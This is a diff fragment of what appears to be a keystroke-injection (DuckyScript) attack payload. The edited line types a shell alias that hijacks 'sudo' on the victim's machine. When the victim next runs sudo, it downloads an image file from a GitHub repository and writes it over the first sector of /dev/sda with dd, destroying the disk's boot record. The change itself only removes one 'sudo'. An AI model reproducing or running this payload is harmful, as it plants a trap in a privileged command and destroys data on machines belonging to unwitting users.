@@ -16,7 +16,7 @@ END
 ENTER
 SPACE
 REPEAT 3
-STRING alias sudo='sudo wget https://github.com/brainsmoke/nyanmbr/blob/master/nyan.img && sudo dd if=nyan.img of=/dev/sda bs=512 count=1'
+STRING alias sudo='sudo wget https://github.com/brainsmoke/nyanmbr/blob/master/nyan.img && dd if=nyan.img of=/dev/sda bs=512 count=1'
 CTRL o
 DELAY 150
 ENTER
